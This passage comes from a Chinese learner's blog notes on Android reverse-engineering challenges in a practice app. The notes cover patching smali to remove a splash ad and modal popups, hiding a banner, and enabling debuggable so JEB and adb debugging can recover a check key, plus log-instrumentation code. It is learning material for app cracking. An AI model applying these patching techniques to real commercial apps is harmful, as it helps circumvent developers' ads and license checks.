活动生命周期的一部分，它并不需要在代码中手动调用。Android 框架会自动调用 onCreate 方法来初始化活动。–来自gpt</p></blockquote><ul><li><p>调用oncreat先调用父类的初始化方法，然后布置布局文件，再调用loadAd方法，这个方法创建的控制器（可能是这个名字？，没学过Java,暂时这么认为），3000ms后调用下一个名字怪怪的方法，再走到jump方法，开启新的活动，终结当前活动。</p></li><li><p>把3000改为0即可。（要在smail语言中改）</p><p>现在一进去就是这个了，看不到3s的过屏广告。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141720038.png" alt="image-20240914172046960"></p></li></ul><p>另：突然想起activity记录可以用mt管理器直接获取，比用开发者助手拼手速强。</p><ol start="2"><li><p>清除后续弹窗</p><blockquote><p>算法助手傻瓜式操作，且需要在环境中一直开着，迁移性低且简单，不再赘述。</p></blockquote></li></ol><ul><li><p>资源定位找到这里</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141731899.png" alt="image-20240914173154863"></p></li></ul><p>后续忘记了，再去看一眼视频。。。</p><p>回头补第一个，可以直接根据程序内部的选择选项来跳转到thirdacitivty：</p><ul><li><p>去class.dex里搜索！！！！（看了一遍又忘了去哪儿搜索了，又回头看的）搜索类名(别复制成main了，问就是复制错了一次，发现找不到重改的)</p><p>从adactivity里复制最后一条（类的smail路径代码）</p></li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141750706.png" alt="image-20240914175016631"></p><p>复制下来以后选择搜索代码，由于要选择调用它的，所以排除上面那俩多的，最终只剩一个结果（转成java需要vip，含泪换np，留下贫穷的泪水:cry:</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141751331.png" alt="image-20240914175101271"></p><p>转成java后看的很明确，就是这一堆选择，改到third就好。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141758470.png" alt="image-20240914175856395"></p><p>根据跳转逻辑找到这里，把名字改了就</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141800342.png" alt="image-20240914180043290"></p><p>改成ChallengeThird,测试一下，确实没有ad的那个广告了（而不是0ms看不到顺闪）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141802284.png" alt="image-20240914180259201"></p><p>好奇后续的广告弹窗都叫dialog，查了查</p><blockquote><p> 弹窗又称为对话框，是App与用户进行交互的常见方式之一。<strong>弹窗分为模态弹窗和非模态弹窗两种，两者的区别在于需不需要用户对其进行回应。</strong> <strong>模态弹窗</strong>会打断用户的正常操作，要求用户必须对其进行回应，否则不能继续其它操作行为；非模态弹窗则不会影响用户的操作，用户可以不对其进行回应，非模态弹窗通常都有时间限制，出现一段时间后就会自动消失。</p><p> <strong>非模态弹窗一般被设计成用来告诉用户信息内容，而模态弹窗除了告诉用户信息内容外还需要用户对其进行功能操作。</strong></p><p> 来自<a href="https://www.cnblogs.com/Starry-20200305/p/12513545.html">Android 四个对话框区别（Toast、Dialog、Actionbar 和 Snackbar） - 一朵小红花儿 - 博客园 (cnblogs.com)</a></p></blockquote><p>这里的就被设计为模态弹窗，不允许干别的。。</p><p>从算法助手里找到对应的调用堆栈，查看相应的内容进行分析，下面都是各种方法，要用方法查询。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142000087.png" alt="image-20240914200031991"></p><p>根据方法名搜寻到后，一下是java代码，根据java去看smail代码，</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142017344.png" alt="image-20240914201700267"></p><p>将这两个dialog的show函数去掉</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142017924.png" alt="image-20240914201727898"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142018014.png" alt="image-20240914201759971"></p><p>点进去检验，已经去掉。</p><ol start="3"><li><p>去除挡着的横幅（这里也就是一个置于最顶层的图片）</p><p>用开发助手的布局查看，复制其id</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142028685.png" alt="image-20240914202803592"></p></li></ol><p>资源定位找到名字？（原视频没有这一步，但是我寻思之前查图片，使用这里的资源定位），嘶记混了，图片就是查xml，这里是改文字的。。。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142030892.png" alt="image-20240914203001849"></p><p>   资源id搜索到这个xml</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142031082.png" alt="image-20240914203151027"><br>   下面这行代码可以让图片&#x2F;文字隐藏，用这个，或者将图片宽高改为0dp。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">android:</span>visibility=<span class="hljs-string">&quot;gone&quot;</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409142036490.png" alt="image-20240914203638371"></p><h2 id="第四关重现（太长了，跟着做的）"><a href="#第四关重现（太长了，跟着做的）" class="headerlink" title="第四关重现（太长了，跟着做的）"></a>第四关重现（太长了，跟着做的）</h2><p>给安装包赋予debug权限</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">android:</span>debuggable=<span class="hljs-string">&quot;true&quot;</span><br></code></pre></td></tr></table></figure><p>密钥错误的提示找到这里</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111042636.png" alt="image-20241011104203575"></p><p>找到对应的判断。</p><p>debug得到密钥</p><p>debug的启动方式：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -D -n <span class="hljs-keyword">com</span>.zj.wuaipojie/.ui.MainActivity<br></code></pre></td></tr></table></figure><p>adb shell am start -D -n<br>adb shell am start -D -n 包名&#x2F;类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p><p>包名：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111050982.png" alt="image-20241011105012937"></p><p>启动类名：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111052188.png" alt="image-20241011105201129"></p><p>启动debug模式后</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111053752.png" alt="image-20241011105353381"></p><p>点调试后找不到对应的进程，可能安装包不一致，尝试一下</p><p>还是不行，看评论区，自行安装一个adb。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111100144.png" alt="image-20241011110019097"></p><p>安装了一个新的，还是不行（原来不是最新的），官网下载了一个最新的，然后重启jeb，显示出来了。</p><p>调试步入后在这里找到，按理说它应该是返回的v0，在函数的外面就能看到，但是这里显示不出来，去里面看的结果。（说是虚拟机与真机的区别。。）（虚拟机会有些奇奇怪怪的bug）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111140390.png" alt="image-20241011114014227"></p><p>密钥正确（v)</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410111142019.png" alt="image-20241011114217973"></p><p>log插桩。感觉不难，先写写作业，有时间再试一次。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">invoke-<span class="hljs-keyword">static</span> &#123;对应寄存器&#125;, Lcom<span class="hljs-regexp">/mtools/</span>LogUtils;-&gt;v(Ljava<span class="hljs-regexp">/lang/</span>Object;)V<br></code></pre></td></tr></table></figure><p>先根据文字找到对应的判断，然后判断知道是ChallengFourth这个类，找到check方法，跳转过去，找到执行结果，插桩。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410181915331.png" alt="image-20241018191551204"></p><p>那个一直报错，一细看，插错位置了。。。改到正确的位置，还是报错</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410181954680.png" alt="image-20241018195450625"></p><p>改成两个v0，可以保存，但是进去会闪退；</p><p>再回去改，弄成一个v0，这次没事了？？？（怀疑是classes2没有正常载入）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410182006616.png" alt="image-20241018200634573"></p><p>注意，算法助手需要联网才能正常捕获日志。。。（怪不得重试了好几次都没有日志）</p><p>成功。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410182012296.png" alt="image-20241018201228243"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410182011672.png" alt="image-20241018201146632"></p>]]></content>
    
    
    <categories>
      
      <category>android reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
